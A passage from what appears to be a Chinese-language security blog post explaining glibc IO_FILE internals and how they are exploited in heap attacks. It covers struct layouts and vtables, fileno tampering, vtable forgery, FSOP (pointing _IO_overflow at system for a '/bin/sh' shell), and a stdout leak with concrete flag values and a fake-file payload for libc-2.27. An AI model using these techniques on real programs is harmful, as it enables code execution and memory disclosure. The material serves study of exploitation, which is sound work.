f->_IO_write_base)个字节的数据\n  if (ch == EOF)\n    return _IO_do_write (f, f->_IO_write_base,\n             f->_IO_write_ptr - f->_IO_write_base);\n  return (unsigned char) ch;\n}\nlibc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)\n    \nstatic _IO_size_t new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)\n{\n  ...\n  _IO_size_t count;\n  // 为了不执行else if分支中的内容以产生错误，可构造_flags包含_IO_IS_APPENDING 或 设置_IO_read_end等于_IO_write_base\n  if (fp->_flags & _IO_IS_APPENDING)\n    fp->_offset = _IO_pos_BAD;\n  else if (fp->_IO_read_end != fp->_IO_write_base)\n    {\n      _IO_off64_t new_pos\n    = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);\n      if (new_pos == _IO_pos_BAD)\n    return 0;\n      fp->_offset = new_pos;\n    }\n  // 调用函数输出输出缓冲区\n  count = _IO_SYSWRITE (fp, data, to_do);\n  ...\n  return count;\n}\n```\n\n综上，为了做到**任意读**，需要满足如下条件：\n(1) 设置`_flag &~ _IO_NO_WRITES`，即`_flag &~ 0x8`；\n(2) 设置`_flag & _IO_CURRENTLY_PUTTING`，即`_flag | 0x800`；\n(3) 设置`_fileno`为`1`(stdout)；\n(4) 设置`_IO_write_base`指向想要泄露的地方，`_IO_write_ptr`指向泄露结束的地址；\n(5) 设置`_IO_read_end`等于`_IO_write_base` 或 设置`_flag & _IO_IS_APPENDING`即，`_flag | 0x1000`。\n此外，有一个**大前提**：需要调用`_IO_OVERFLOW()`才行，因此**需使得需要输出的内容中含有`\\n`换行符 或 设置`_IO_write_end`等于`_IO_write_ptr`**（输出缓冲区无剩余空间）等。\n一般来说，经常利用`puts`函数加上述`stdout`任意读的方式泄露`libc`。\n\nflag的构造如下：\n\n```c\n_flags = 0xfbad0000 \n_flags & = ~_IO_NO_WRITES // _flags = 0xfbad0000\n_flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800\n_flags | = _IO_IS_APPENDING // _flags = 0xfbad1800\n```\n\n例如在`libc-2.27`下，构造`fakefile = p64(0xfbad1800) + p64(0)*3 + b'\\x58'`（`\\x58`覆盖`write_base`的低位），泄露出的第一个地址即为`_IO_file_jumps`的地址。\n","slug":"IO_FILE","published":1,"updated":"2023-03-19T13:01:30.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czaf5000n5oud6k1l6n0l","content":"<p>IO_FILE是linux中的文件流，在堆利用无法使用hook来get shell时，常常通过IO_FILE的方式控制程序流来get shell。</p>\n<span id=\"more\"></span>\n\n<p>在linux中，一切都被当作文件处理，那自然就包括了IO，IO_FILE就是用来描述IO的文件结构体。所有的文件流文件都是_IO_FILE_plus的结构。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE_plus</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    _IO_FILE file; <span class=\"comment\">//完整的结构体内容</span></span><br><span class=\"line\">    <span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_jump_t</span>* <span class=\"title\">vtable</span>;</span> <span class=\"comment\">//仅有一个指针</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其中file是文件流，是linux中用于描述文件的结构，包含文件的关键数据，vtable则是一个<strong>虚表（虚拟函数表）</strong>，保存的是各种操作函数的指针，在对文件流进行操作时，实际是调用该虚表中的函数。</p>\n<p>为了管理所有的IO流，存在一个<strong>全局变量</strong>_IO_list_all的指针，这个指针指向<strong>IO_2_1_stderr</strong> 这个IO_FILE结构体，_IO_FILE结构体中会通过指针形成链表连接在一起。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE_plus</span>* _<span class=\"title\">IO_list_all</span>;</span> </span><br></pre></td></tr></table></figure>\n\n<p>在使用fopen函数打开文件时，会创建一个对应该文件的_IO_FILE_plus结构体，并将其存放在<strong>堆</strong>中，其<strong>返回值就是其_IO_FILE结构file</strong>。</p>\n<p>除了_IO_2_1_stderr_（stderr）之外，程序原本还有输入输出流，因此堆中还有_IO_2_1_stdout_和_IO_2_1_stdin_。在链表中stderr-&gt;stdout-&gt;stdin。新加入的IO_FILE会从头（_IO_list_all）处链入链表，因此stdin实际上是链表的最后一个，所以他们的对应文件描述符0(stdin),1(stdout),2(stderr)也是有道理的。</p>\n<p>因为_IO_FILE存放在堆中（stderr、stdout、stdin除外，他们在libc中），因此许多对IO_FILE的利用都与堆相关。</p>\n<p>完整的<code>_IO_FILE_plus</code>结构如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_FILE_plus = &#123;</span><br><span class=\"line\">\t<span class=\"string\">&#x27;amd64&#x27;</span>:&#123;</span><br><span class=\"line\">\t\t<span class=\"number\">0x0</span>:<span class=\"string\">&#x27;_flags&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x8</span>:<span class=\"string\">&#x27;_IO_read_ptr&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x10</span>:<span class=\"string\">&#x27;_IO_read_end&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x18</span>:<span class=\"string\">&#x27;_IO_read_base&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x20</span>:<span class=\"string\">&#x27;_IO_write_base&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x28</span>:<span class=\"string\">&#x27;_IO_write_ptr&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x30</span>:<span class=\"string\">&#x27;_IO_write_end&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x38</span>:<span class=\"string\">&#x27;_IO_buf_base&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x40</span>:<span class=\"string\">&#x27;_IO_buf_end&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x48</span>:<span class=\"string\">&#x27;_IO_save_base&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x50</span>:<span class=\"string\">&#x27;_IO_backup_base&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x58</span>:<span class=\"string\">&#x27;_IO_save_end&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x60</span>:<span class=\"string\">&#x27;_markers&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x68</span>:<span class=\"string\">&#x27;_chain&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x70</span>:<span class=\"string\">&#x27;_fileno&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x74</span>:<span class=\"string\">&#x27;_flags2&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x78</span>:<span class=\"string\">&#x27;_old_offset&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x80</span>:<span class=\"string\">&#x27;_cur_column&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x82</span>:<span class=\"string\">&#x27;_vtable_offset&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x83</span>:<span class=\"string\">&#x27;_shortbuf&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x88</span>:<span class=\"string\">&#x27;_lock&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x90</span>:<span class=\"string\">&#x27;_offset&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x98</span>:<span class=\"string\">&#x27;_codecvt&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xa0</span>:<span class=\"string\">&#x27;_wide_data&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xa8</span>:<span class=\"string\">&#x27;_freeres_list&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xb0</span>:<span class=\"string\">&#x27;_freeres_buf&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xb8</span>:<span class=\"string\">&#x27;__pad5&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xc0</span>:<span class=\"string\">&#x27;_mode&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xc4</span>:<span class=\"string\">&#x27;_unused2&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xd8</span>:<span class=\"string\">&#x27;vtable&#x27;</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"IO-FILE\"><a href=\"#IO-FILE\" class=\"headerlink\" title=\"_IO_FILE\"></a>_IO_FILE</h2><p>其中_IO_FILE的结构如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> &#123;</span></span><br><span class=\"line\">  <span class=\"type\">int</span> _flags; <span class=\"comment\">/* low-order is flags.*/</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _IO_file_flags _flags</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_read_ptr;   <span class=\"comment\">/* Current read pointer */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_read_end;   <span class=\"comment\">/* End of get area. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_read_base;  <span class=\"comment\">/* Start of putback+get area. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_write_base; <span class=\"comment\">/* Start of put area. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_write_ptr;  <span class=\"comment\">/* Current put pointer. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_write_end;  <span class=\"comment\">/* End of put area. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_buf_base;   <span class=\"comment\">/* Start of reserve area. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_buf_end;    <span class=\"comment\">/* End of reserve area. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">char</span> *_IO_save_base; </span><br><span class=\"line\">  <span class=\"type\">char</span> *_IO_backup_base; </span><br><span class=\"line\">  <span class=\"type\">char</span> *_IO_save_end; </span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_marker</span> *_<span class=\"title\">markers</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> *_<span class=\"title\">chain</span>;</span><span class=\"comment\">/*指向下一个file结构*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">int</span> _fileno;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> 0</span></span><br><span class=\"line\">  <span class=\"type\">int</span> _blksize;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">  <span class=\"type\">int</span> _flags2;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">  _IO_off_t _old_offset; </span><br><span class=\"line\"></span><br><span class=\"line\">[...]</span><br><span class=\"line\">  _IO_lock_t *_lock;</span><br><span class=\"line\">  <span class=\"meta\">#<span class=\"keyword\">ifdef</span> _IO_USE_OLD_IO_FILE <span class=\"comment\">//开始宏判断（这段判断结果为否，所以没有定义_IO_FILE_complete，下面还是_IO_FILE）</span></span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE_complete</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> _<span class=\"title\">file</span>;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span> <span class=\"comment\">//结束宏判断</span></span></span><br><span class=\"line\">[...] </span><br><span class=\"line\"><span class=\"type\">int</span> _mode;</span><br><span class=\"line\">  <span class=\"comment\">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class=\"line\">  <span class=\"type\">char</span> _unused2[<span class=\"number\">15</span> * <span class=\"keyword\">sizeof</span> (<span class=\"type\">int</span>) - <span class=\"number\">4</span> * <span class=\"keyword\">sizeof</span> (<span class=\"type\">void</span> *) - <span class=\"keyword\">sizeof</span> (<span class=\"type\">size_t</span>)];</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>可以看到_IO_FILE结构中存放着文件的基本信息，比如说：读/写的起始和结束位置，当前读/写位置，缓冲区的起始和结束位置，保存位置等。</p>\n<p>比较关键的还有一个_chain，它指向下一个_IO_FILE结构，通过该指针将所有_IO_FILE连成一个链表。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> *_<span class=\"title\">chain</span>;</span><span class=\"comment\">/*指向下一个file结构*/</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"IO-JUMP-t虚表\"><a href=\"#IO-JUMP-t虚表\" class=\"headerlink\" title=\"_IO_JUMP_t虚表\"></a>_IO_JUMP_t虚表</h2><h3 id=\"虚表和虚函数\"><a href=\"#虚表和虚函数\" class=\"headerlink\" title=\"虚表和虚函数\"></a>虚表和虚函数</h3><p>虚表和虚函数在C语言中不常见，甚至不像C++那样有virtual关键字实现虚函数。实际上虚表和虚函数是用于实现<strong>多态</strong>这种特性的，而C语言本身是面向过程的，因此没有virtual也在情理之中。</p>\n<p>但实际上，C语言是可以做到面向对象的，通过struct结构体可以实现类似类的结构，<strong>结构体中的数据就相当于是类中的成员变量，结构体中的函数指针就相当于是类中的成员函数</strong>。</p>\n<p>但是这种方法本身也有些弊端，每个结构体实例都会包含所有的函数指针，而每个函数指针都要占据空间（即使其没有被使用）。因此在C语言编程中很少会有将函数指针写在结构体内的，而是在结构体外写一个函数，通过参数传入结构体的实例来对结构体进行操作。实际上在C++中，如果没有virtual关键字的话，编译器也会采取类似的方法对成员函数进行处理。</p>\n<p>但如果要实现<strong>多态</strong>的话，就不能用这种节省内存的方法了。对于C语言而言，就是将函数指针放在结构体中，每一个结构体实例通过该函数指针指向自己定义的函数，并且通过该函数指针调用它，这样的函数就可以说是虚函数。</p>\n<p>那虚表是什么呢？毕竟虚函数的数量可能不止一个，并且和一般的函数有些不一样（存在其他同名函数），为了方便对每个实例的虚函数进行管理，就有了虚表这种结构。<strong>虚表实际上就是虚函数的表，用来管理虚函数</strong>，虚表是从属于该类的，会通过一个指针指向该虚表。</p>\n<h3 id=\"IO-JUMP-T结构\"><a href=\"#IO-JUMP-T结构\" class=\"headerlink\" title=\"_IO_JUMP_T结构\"></a>_IO_JUMP_T结构</h3><p>_IO_jump_t结构如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> JUMP_FIELD(TYPE, NAME) TYPE NAME</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_jump_t</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    JUMP_FIELD(<span class=\"type\">size_t</span>, __dummy);<span class=\"comment\">//0</span></span><br><span class=\"line\">    JUMP_FIELD(<span class=\"type\">size_t</span>, __dummy2);<span class=\"comment\">//1 DUMMY</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_finish_t, __finish);<span class=\"comment\">//2 finish</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_overflow_t, __overflow);<span class=\"comment\">//3 overflow</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_underflow_t, __underflow);<span class=\"comment\">//4 underflow</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_underflow_t, __uflow);<span class=\"comment\">//5 uflow</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<span class=\"comment\">//6 pbackfail </span></span><br><span class=\"line\">    <span class=\"comment\">/* showmany */</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_xsputn_t, __xsputn);<span class=\"comment\">//7 xsputn</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<span class=\"comment\">//8 xsgetn</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_seekoff_t, __seekoff);<span class=\"comment\">//9 seekoff</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_seekpos_t, __seekpos);<span class=\"comment\">//10 seekpos</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_setbuf_t, __setbuf);<span class=\"comment\">//11 setbuf</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_sync_t, __sync);<span class=\"comment\">//12 sync</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_doallocate_t, __doallocate);<span class=\"comment\">//13 doallocate</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_read_t, __read);<span class=\"comment\">//14 read</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_write_t, __write);<span class=\"comment\">//15 write</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_seek_t, __seek);<span class=\"comment\">//16 seek</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_close_t, __close);<span class=\"comment\">//17 close</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_stat_t, __stat);<span class=\"comment\">//18 stat</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<span class=\"comment\">//19 showmanyc</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_imbue_t, __imbue);<span class=\"comment\">//20 imbue</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> 0</span></span><br><span class=\"line\">    get_column;</span><br><span class=\"line\">    set_column;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>对文件操作的函数都会调用该文件流中vtable中的函数</p>\n<h3 id=\"部分文件操作函数简介\"><a href=\"#部分文件操作函数简介\" class=\"headerlink\" title=\"部分文件操作函数简介\"></a>部分文件操作函数简介</h3><h4 id=\"fread\"><a href=\"#fread\" class=\"headerlink\" title=\"fread\"></a>fread</h4><p>fread 是标准 IO 库函数，作用是从文件流中读数据，函数原型如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">size_t</span> <span class=\"title function_\">fread</span> <span class=\"params\">( <span class=\"type\">void</span> *buffer, <span class=\"type\">size_t</span> size, <span class=\"type\">size_t</span> count, FILE *stream)</span> ;</span><br></pre></td></tr></table></figure>\n\n<p>fread 的代码位于 /libio/iofread.c 中，函数名为_IO_fread，但真正的功能实现在子函数_IO_sgetn 中。在_IO_sgetn 函数中会取出vtable中的_IO_XSGETN并调用。</p>\n<h4 id=\"fwrite\"><a href=\"#fwrite\" class=\"headerlink\" title=\"fwrite\"></a>fwrite</h4><p>fwrite 也是标准 IO 库函数，作用是向文件流写入数据，函数原型如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">size_t</span> <span class=\"title function_\">fwrite</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* buffer, <span class=\"type\">size_t</span> size, <span class=\"type\">size_t</span> count, FILE* stream)</span>;</span><br></pre></td></tr></table></figure>\n\n<p>fwrite 的代码位于 / libio/iofwrite.c 中，函数名为_IO_fwrite。 在_IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。调用_IO_XSPUTN需要首先取出 vtable 中的指针，再跳过去进行调用。</p>\n<h4 id=\"fopen\"><a href=\"#fopen\" class=\"headerlink\" title=\"fopen\"></a>fopen</h4><p>fopen 在标准 IO 库中用于打开文件，函数原型如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FILE *<span class=\"title function_\">fopen</span><span class=\"params\">(<span class=\"type\">char</span> *filename, *type)</span>;</span><br></pre></td></tr></table></figure>\n\n<p>首先fopen中会为该文件创建一个FILE结构，由于其内部<strong>使用malloc函数为FILE结构分配空间</strong>，因此该FILE结构在堆上。</p>\n<p>之后fopen会初始化vtable的内容，并调用_IO_file_init 对FILE初始化操作。</p>\n<p>最后fopen会将该IO_FILE链入_IO_list_all指向的链表中，并调用系统调用open。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//可见_chain指向的是更先创建的IO_FILE，_IO_list_all指向的始终是最后创建的IO_FILE</span></span><br><span class=\"line\">fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class=\"line\">_IO_list_all = fp;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"fclose\"><a href=\"#fclose\" class=\"headerlink\" title=\"fclose\"></a>fclose</h4><p>fclose 是标准 IO 库中用于关闭已打开文件的函数，函数原型如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">fclose</span><span class=\"params\">(FILE *stream)</span>;</span><br></pre></td></tr></table></figure>\n\n<p>fclose和fopen的操作正好相反，fclose首先会调用_IO_unlink_it 将指定的 FILE 从_chain 链表中脱链。</p>\n<p>之后会调用_IO_file_close_it 函数，_IO_file_close_it 会调用系统接口 close 关闭文件。</p>\n<p>最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构。</p>\n<h4 id=\"printf-puts\"><a href=\"#printf-puts\" class=\"headerlink\" title=\"printf/puts\"></a>printf/puts</h4><p>printf 和 puts 是常用的输出函数，在 printf 的参数是以’\\n’结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。</p>\n<p>puts 在源码中实现的函数是_IO_puts，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会调用 vtable 中的_IO_sputn，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。</p>\n<p>printf 的调用栈回溯如下，同样是通过_IO_file_xsputn 实现</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">vfprintf</span>+<span class=\"number\">11</span></span><br><span class=\"line\">_IO_file_xsputn</span><br><span class=\"line\">_IO_file_overflow</span><br><span class=\"line\">funlockfile</span><br><span class=\"line\">_IO_file_write</span><br><span class=\"line\">write</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"IO-FILE利用\"><a href=\"#IO-FILE利用\" class=\"headerlink\" title=\"IO_FILE利用\"></a>IO_FILE利用</h2><h3 id=\"对fileno的利用\"><a href=\"#对fileno的利用\" class=\"headerlink\" title=\"对fileno的利用\"></a>对fileno的利用</h3><p>每个文件流都有一个文件描述符<code>stdin:0, stdout:1, stderr:2</code>，这个文件描述符保存在<code>IO_FILE+0x70</code>的<code>fileno</code>字段。</p>\n<p>修改该字段能够修改文件处理的位置，本来<code>fileno==0</code>表示从标准输入中读取，修改为<code>3</code>则表示为从文件描述符为<code>3</code>的文件（已经<code>open</code>的文件）中读取。</p>\n<h3 id=\"伪造-vtable-劫持程序流程-libc2-23及以前\"><a href=\"#伪造-vtable-劫持程序流程-libc2-23及以前\" class=\"headerlink\" title=\"伪造 vtable 劫持程序流程(libc2.23及以前)\"></a>伪造 vtable 劫持程序流程(libc2.23及以前)</h3><p>许多与文件相关的操作都要对IO_FILE进行操作，这就离不开_IO_FILE_plus中的vtable，一些函数会从vtable中取出函数指针进行调用。因此如果能伪造vtable的话，我们就能劫持程序的流程。</p>\n<p>伪造vtable一般有两种做法:</p>\n<ol>\n<li>直接修改vtable中的函数指针</li>\n<li>覆盖vtable指向我们控制的内存，并在其中伪造vtable</li>\n</ol>\n<h3 id=\"FSOP\"><a href=\"#FSOP\" class=\"headerlink\" title=\"FSOP\"></a>FSOP</h3><p>FSOP 是 File Stream Oriented Programming 的缩写（面向文件流编程），进程内所有的_IO_FILE 结构会使用<code>_chain</code> 域相互连接形成一个链表，<code>_IO_list_all</code> 指向链表头。</p>\n<p>FSOP 的核心思想就是<strong>劫持<code>_IO_list_all</code> 来伪造链表和其中的_IO_FILE 项（包括file和vtable）</strong>。只要劫持了<code>_IO_list_all</code>并在对应位置伪造_IO_FILE项，就相当于劫持了所有关于文件的数据和操作。</p>\n<p>单纯的伪造只是构造了数据，不能达到<strong>劫持程序流程</strong>的目的。FSOP 选择调用<code>_IO_flush_all_lockp</code>来劫持程序流，这个函数会刷新<code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用<code>_IO_FILE_plus.vtable</code> 中的<code>_IO_overflow</code>，最终的效果就是执行<code>_IO_overflow(fp)</code>。</p>\n<p>因此如果能将<code>_IO_overflow</code>修改为<code>system</code>，将<code>file</code>结构的<code>flag</code>修改为<code>&quot;/bin/sh\\x00&quot;</code>，就可以通过<code>_IO_overflow(fp)</code>执行<code>system(&quot;/bin/sh\\x00&quot;)</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span 